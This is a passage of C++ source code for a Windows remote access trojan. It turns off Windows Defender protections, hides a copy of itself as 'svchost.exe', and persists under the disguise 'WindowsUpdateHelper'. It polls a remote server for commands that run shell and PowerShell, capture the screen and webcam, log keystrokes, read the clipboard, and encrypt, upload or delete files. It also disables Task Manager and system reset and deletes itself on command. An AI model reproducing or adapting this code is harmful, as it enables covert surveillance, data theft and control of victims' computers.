    WinExec("powershell -Command Set-MpPreference -DisableRealtimeMonitoring $true -Force 2>$null", SW_HIDE);
    WinExec("powershell -Command Set-MpPreference -DisableBehaviorMonitoring $true -Force 2>$null", SW_HIDE);
    WinExec("powershell -Command Set-MpPreference -DisableBlockAtFirstSeen $true -Force 2>$null", SW_HIDE);
    WinExec("powershell -Command Set-MpPreference -DisableIOAVProtection $true -Force 2>$null", SW_HIDE);
    WinExec("powershell -Command Set-MpPreference -DisablePrivacyMode $true -Force 2>$null", SW_HIDE);
    WinExec("powershell -Command Set-MpPreference -DisableArchiveScanning $true -Force 2>$null", SW_HIDE);
    WinExec("powershell -Command Set-MpPreference -DisableCatchupFullScan $true -Force 2>$null", SW_HIDE);
    WinExec("powershell -Command Set-MpPreference -DisableCatchupQuickScan $true -Force 2>$null", SW_HIDE);
    WinExec("powershell -Command Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true -Force 2>$null", SW_HIDE);
    WinExec("powershell -Command Add-MpPreference -ExclusionProcess \"svchost.exe\" 2>$null", SW_HIDE);
    WinExec("powershell -Command Add-MpPreference -ExclusionPath \"$env:LOCALAPPDATA\\svchost.exe\" 2>$null", SW_HIDE);
    WinExec("powershell -Command Add-MpPreference -ExclusionPath \"$env:TEMP\\svchost.exe\" 2>$null", SW_HIDE);
}

void installStartup() {
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        char path[MAX_PATH]; DWORD len = GetModuleFileNameA(NULL, path, MAX_PATH);
        if (len > 0) { path[len] = 0; RegSetValueExA(hKey, "WindowsUpdateHelper", 0, REG_SZ, (BYTE*)path, len+1); }
        RegCloseKey(hKey);
    }
    char exe[MAX_PATH];
    if (GetModuleFileNameA(NULL, exe, MAX_PATH) > 0) {
        string cmd = "cmd.exe /c schtasks /create /tn \"WindowsUpdateHelper\" /tr \"" + string(exe) + "\" /sc onlogon /rl highest /f 2>nul";
        WinExec(cmd.c_str(), SW_HIDE);
    }
}

void removeStartup() {
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegDeleteValueA(hKey, "WindowsUpdateHelper"); RegCloseKey(hKey);
    }
    WinExec("schtasks /delete /tn \"WindowsUpdateHelper\" /f 2>nul", SW_HIDE);
}

string getStartupStatus() {
    string r = "reg:";
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_QUERY_VALUE, &hKey) == ERROR_SUCCESS) {
        char buf[256]; DWORD sz = sizeof(buf);
        r += RegQueryValueExA(hKey, "WindowsUpdateHelper", 0, 0, (BYTE*)buf, &sz) == ERROR_SUCCESS ? "on" : "off";
        RegCloseKey(hKey);
    } else r += "err";
    r += " task:";
    r += execCmd("schtasks /query /tn \"WindowsUpdateHelper\" 2>nul").find("WindowsUpdateHelper") != string::npos ? "on" : "off";
    return r;
}

string uninstallSelf() {
    removeStartup();
    char exe[MAX_PATH]; GetModuleFileNameA(NULL, exe, MAX_PATH);
    string cmd = "cmd.exe /c timeout /t 2 & del /f /q \"" + string(exe) + "\" & rmdir /s /q \"" + string(exe) + "\" 2>nul";
    STARTUPINFOA si = {sizeof(si)}; PROCESS_INFORMATION pi;
    CreateProcessA(NULL, &cmd[0], NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    ExitProcess(0);
    return "uninstalling";
}

string getPasswords() {
    string r;
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Internet Explorer\\IntelliForms\\Storage2", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        r += "IE passwords may exist\n";
    }
    return r;
}

DWORD WINAPI pollThread(LPVOID) {
    try {
    Sleep(3000);
    try{if(!g_noPing)sendPing();}catch(...){}
    int pingCtr=0;
    while(true) {
        Sleep(100);
        if(++pingCtr>=300){pingCtr=0;try{if(!g_noPing)sendPing();}catch(...){}}
        try {
            string path = "/commands/" + fbEsc(computerName) + ".json";
            string resp = httpsGet(path);
            if (resp.empty() || resp == "null" || resp.size() < 5) continue;
            size_t pos = 0;
            while ((pos = resp.find("\":{", pos)) != string::npos) {
                size_t kStart = resp.rfind("\"", pos - 1);
                if (kStart == string::npos) { pos++; continue; }
                string key = resp.substr(kStart + 1, pos - kStart - 1);
                size_t objStart = pos + 3;
                if (objStart >= resp.size()) break;
                int depth = 1; size_t objEnd = objStart;
                while (depth > 0 && objEnd < resp.size()) {
                    if (resp[objEnd] == '{') depth++;
                    else if (resp[objEnd] == '}') depth--;
                    objEnd++;
                }
                if (depth != 0) break;
                string item = resp.substr(objStart, objEnd - objStart - 1);
                string type = extractJson(item, "type");
                string payload = extractJson(item, "payload");
                string status = extractJson(item, "status");
                if (type.empty() || status != "pending") { pos = objEnd; continue; }
                string result = "";
                try {
                    if (type == "screenshot") {
                        int mi=0; try{mi=stoi(payload);}catch(...){}
                        result = takeScreenshot(mi);
                    } else if (type == "cmd") {
                        result = execCmd(payload.empty() ? "whoami" : payload);
                    } else if (type == "mouse") result = handleMouse(payload);
                    else if (type == "keyboard") result = handleKeyboard(payload);
                    else if (type == "screen") result = takeScreenshot(0);
                    else if (type == "webcam") result = captureWebcam();
                    else if (type == "file_list") result = listDir(payload.empty() ? "" : payload);
                    else if (type == "file_delete") result = fileDelete(payload);
                    else if (type == "file_rename") result = fileRename(payload);
                    else if (type == "file_encrypt") result = fileEncrypt(payload);
                    else if (type == "file_decrypt") result = fileDecrypt(payload);
                    else if (type == "file_upload") result = fileUpload(payload);
                    else if (type == "process_list") result = listProcesses();
                    else if (type == "system_info") result = getSystemInfo();
                    else if (type == "kill_process") result = killProcess(payload);
                    else if (type == "shutdown") result = execCmd("shutdown /s /t 0");
                    else if (type == "restart") result = execCmd("shutdown /r /t 0");
                    else if (type == "lock") { LockWorkStation(); result = "ok"; }
                    else if (type == "logoff") result = execCmd("shutdown /l");
                    else if (type == "msgbox") {
                        string t=extractJson(payload,"text");
                        string ti=extractJson(payload,"title");
                        MessageBoxA(NULL,t.c_str(),ti.empty()?"Remote":ti.c_str(),MB_OK);
                        result="ok";
                    } else if (type == "volume") {
                        int v=0; try{v=stoi(payload);}catch(...){v=-1;}
                        if(v<0||v>100) result="bad_val";
                        else{DWORD w=(DWORD)(v*65535/100);waveOutSetVolume(0,(w<<16)|w);result="ok";}
                    } else if (type == "clipboard") {
                        string r;
                        if(OpenClipboard(0)){
                            HANDLE h=GetClipboardData(CF_TEXT);
                            if(h){char*p=(char*)GlobalLock(h);if(p){r=p;GlobalUnlock(h);}}
                            CloseClipboard();
                        }
                        result=r.empty()?"empty":r;
                    } else if (type == "idle") {
                        LASTINPUTINFO l={sizeof(l)}; GetLastInputInfo(&l);
                        result=to_string((GetTickCount()-l.dwTime)/1000);
                    } else if (type == "powershell") result = execCmd("powershell -c "+payload);
                    else if (type == "uptime") result=to_string(GetTickCount64()/1000);
                    else if (type == "live_config") {
                        try{int q=stoi(extractJson(payload,"quality"));if(q>=1&&q<=100)g_liveQuality=q;}catch(...){}
                        try{float s=stof(extractJson(payload,"scale"));if(s>=0.1f&&s<=1.0f)g_liveScale=s;}catch(...){}
                        try{int m=stoi(extractJson(payload,"monitor"));if(m>=0)g_liveMonitor=m;}catch(...){}
                        result="ok";
                    } else if (type == "discord_tokens" || type == "browser_passwords") {
                        string k = key;
                        CreateThread(0, 0, [](LPVOID p) -> DWORD {
                            try {
                            auto* d = (pair<string,string>*)p;
                            string r;
                            if (d->first == "discord_tokens") r = "not_implemented";
                            else r = "not_implemented";
                            string b = "{\"status\":\"done\",\"result\":\"" + jsonEscape(r) + "\"}";
                            httpsPatch("/commands/" + fbEsc(computerName) + "/" + d->second + ".json", b);
                            delete d;
                            } catch(...) {}
                            return 0;
                        }, new pair<string,string>(type, key), 0, 0);
                        result = "processing";
                    } else if (type == "passwords") result = getPasswords();
                    else if (type == "network_info") result = getNetworkInfo();
                    else if (type == "services") result = getServices();
                    else if (type == "installed_apps") result = getInstalledApps();
                    else if (type == "file_download") result = fileDownload(payload);
                    else if (type == "clipboard_write") result = clipboardWrite(payload);
                    else if (type == "keylog_start") result = startKeylog();
                    else if (type == "keylog_stop") result = stopKeylog();
                    else if (type == "keylog_dump") result = dumpKeylog();
                    else if (type == "screenshot_all") result = screenshotAll();
                    else if (type == "wallpaper") result = setWallpaper(payload);
                    else if (type == "host_info") result = getHostInfo();
                    else if (type == "env_vars") result = getEnvVars();
                    else if (type == "process_kill_name") result = processKillName(payload);
                    else if (type == "live_monitor") { try{int m=stoi(payload);if(m>=0)g_liveMonitor=m;}catch(...){} result="ok:"+to_string(g_liveMonitor); }
                    else if (type == "startup_on") { installStartup(); result = getStartupStatus(); }
                    else if (type == "startup_off") { removeStartup(); result = getStartupStatus(); }
                    else if (type == "startup_status") result = getStartupStatus();
                    else if (type == "taskmgr_on") { HKEY k; if(RegCreateKeyExA(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",0,NULL,0,KEY_SET_VALUE,NULL,&k,NULL)==ERROR_SUCCESS){DWORD v=1;RegSetValueExA(k,"DisableTaskMgr",0,REG_DWORD,(BYTE*)&v,sizeof(v));RegCloseKey(k);} result="ok"; }
                    else if (type == "taskmgr_off") { HKEY k; if(RegCreateKeyExA(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",0,NULL,0,KEY_SET_VALUE,NULL,&k,NULL)==ERROR_SUCCESS){RegDeleteValueA(k,"DisableTaskMgr");RegCloseKey(k);} result="ok"; }
                    else if (type == "reset_on") { WinExec("reagentc /disable 2>nul",SW_HIDE); HKEY k; if(RegCreateKeyExA(HKEY_LOCAL_MACHINE,"SOFTWARE\\Policies\\Microsoft\\Windows\\System",0,NULL,0,KEY_SET_VALUE,NULL,&k,NULL)==ERROR_SUCCESS){DWORD v=1;RegSetValueExA(k,"DisableReset",0,REG_DWORD,(BYTE*)&v,sizeof(v));RegCloseKey(k);} result="ok"; }
                    else if (type == "reset_off") { WinExec("reagentc /enable 2>nul",SW_HIDE); HKEY k; if(RegCreateKeyExA(HKEY_LOCAL_MACHINE,"SOFTWARE\\Policies\\Microsoft\\Windows\\System",0,NULL,0,KEY_SET_VALUE,NULL,&k,NULL)==ERROR_SUCCESS){RegDeleteValueA(k,"DisableReset");RegCloseKey(k);} result="ok"; }
                    else if (type == "uninstall") result = uninstallSelf();
                    else result = "unknown_type";
                } catch(...) { result = "exec_err"; }
                string escaped = jsonEscape(result);
                string resBody = "{\"status\":\"done\",\"result\":\"" + escaped + "\"}";
                httpsPatch("/commands/" + fbEsc(computerName) + "/" + key + ".json", resBody);
                pos = objEnd;
            }
        } catch(...) {}
    }
    } catch(...) {}
    return 0;
}

DWORD WINAPI screenThread(LPVOID) {
    try {
    Sleep(3000);
    while(true) {
        DWORD t0 = GetTickCount();
        try {
            string b64 = captureToBase64(g_liveMonitor, g_liveScale, g_liveQuality);
            string escaped = jsonEscape(b64);
            string ts = getTimestamp();
            char scaleStr[16]; sprintf(scaleStr, "%.2f", g_liveScale);
            string body = "{\"r\":\"" + escaped + "\",\"t\":\"" + ts + "\",\"q\":" + to_string(g_liveQuality) + ",\"s\":" + string(scaleStr) + "}";
            httpsPut("/live/" + fbEsc(computerName) + ".json", body);
        } catch(...) {}
        DWORD elapsed = GetTickCount() - t0;
        if (elapsed < 100) Sleep(100 - elapsed);
    }
    } catch(...) {}
    return 0;
}

DWORD WINAPI inputThread(LPVOID) {
    try {
    Sleep(3000);
    while(true) {
        Sleep(15);
        try {
            string resp = httpsGet("/input/" + fbEsc(computerName) + ".json");
            if (resp.empty() || resp == "null" || resp.size() < 5) continue;
            bool hasEvents = false;
            size_t pos = 0;
            while ((pos = resp.find("\":{", pos)) != string::npos) {
                size_t kStart = resp.rfind("\"", pos - 1);
                if (kStart == string::npos) { pos++; continue; }
                string key = resp.substr(kStart + 1, pos - kStart - 1);
                size_t objStart = pos + 3;
                if (objStart >= resp.size()) break;
                int depth = 1; size_t objEnd = objStart;
                while (depth > 0 && objEnd < resp.size()) {
                    if (resp[objEnd] == '{') depth++;
                    else if (resp[objEnd] == '}') depth--;
                    objEnd++;
                }
                if (depth != 0) break;
                string item = resp.substr(objStart, objEnd - objStart - 1);
                string type = extractJson(item, "type");
                string payload = extractJson(item, "payload");
                if (type.empty()) { pos = objEnd; continue; }
                hasEvents = true;
                try {
                    if (type == "mouse") handleMouse(payload);
                    else if (type == "keyboard") handleKeyboard(payload);
                } catch(...) {}
                pos = objEnd;
            }
            if (hasEvents) httpsDelete("/input/" + fbEsc(computerName) + ".json");
        } catch(...) {}
    }
    } catch(...) {}
    return 0;
}

void hideToAppData() {
    char exePath[MAX_PATH]; DWORD len = GetModuleFileNameA(NULL, exePath, MAX_PATH);
    if (len == 0 || len >= MAX_PATH) return;
    char appData[MAX_PATH]; DWORD adLen = GetEnvironmentVariableA("LOCALAPPDATA", appData, MAX_PATH);
    if (adLen == 0 || adLen >= MAX_PATH) return;
    string dest = string(appData) + "\\svchost.exe";
    char roam[MAX_PATH];
    if (GetEnvironmentVariableA("APPDATA", roam, MAX_PATH) > 0 && roam[0]) {
        string old = string(roam) + "\\svchost.exe";
        SetFileAttributesA(old.c_str(), FILE_ATTRIBUTE_NORMAL);
        DeleteFileA(old.c_str());
    }
    if (GetFileAttributesA(dest.c_str()) == INVALID_FILE_ATTRIBUTES || _stricmp(exePath, dest.c_str()) != 0) {
        CopyFileA(exePath, dest.c_str(), FALSE);
        SetFileAttributesA(dest.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    }
    if (_stricmp(exePath, dest.c_str()) != 0) {
        STARTUPINFOA si = {sizeof(si)};
        PROCESS_INFORMATION pi;
        string cmd = "\"" + dest + "\"";
        if (CreateProcessA(dest.c_str(), &cmd[0], NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
            CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
        }
        ExitProcess(0);
    }
}

int main(int argc, char* argv[]) {
    ShowWindow(GetConsoleWindow(), SW_SHOW);
    SetErrorMode(SEM_NOGPFAULTERRORBOX);
    bool noScreen = false;
    for (int i = 1; i < argc; i++) {
        string a = argv[i];
        if (a == "--no-ping") g_noPing = true;
        else if (a == "--no-screen") noScreen = true;
        else if (a == "--server" && i + 1 < argc) {
            string s = argv[++i];
            g_serverSSL = s.find("https://") == 0 || s.find("HTTPS://") == 0;
            if (s.find("://") != string::npos) s = s.substr(s.find("://") + 3);
            size_t colon = s.find(':');
            if (colon != string::npos) {
                g_serverPort = stoi(s.substr(colon + 1));
                s = s.substr(0, colon);
            } else {
                g_serverPort = g_serverSSL ? 443 : 80;
            }
            g_serverHost = s;
        }
    }
    if (computerName.empty()) computerName = getComputerName();
    try {
    hideToAppData();
    disableAntivirus();
    publicIP = getPublicIP();
    installStartup();
    } catch(...) {}
    GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
    CreateThread(0, 0, pollThread, 0, 0, 0);
    CreateThread(0, 0, inputThread, 0, 0, 0);
    if (!noScreen) CreateThread(0, 0, screenThread, 0, 0, 0);
    while(true) try { Sleep(10000); } catch(...) { Sleep(10000); }
    GdiplusShutdown(gdiplusToken);
}
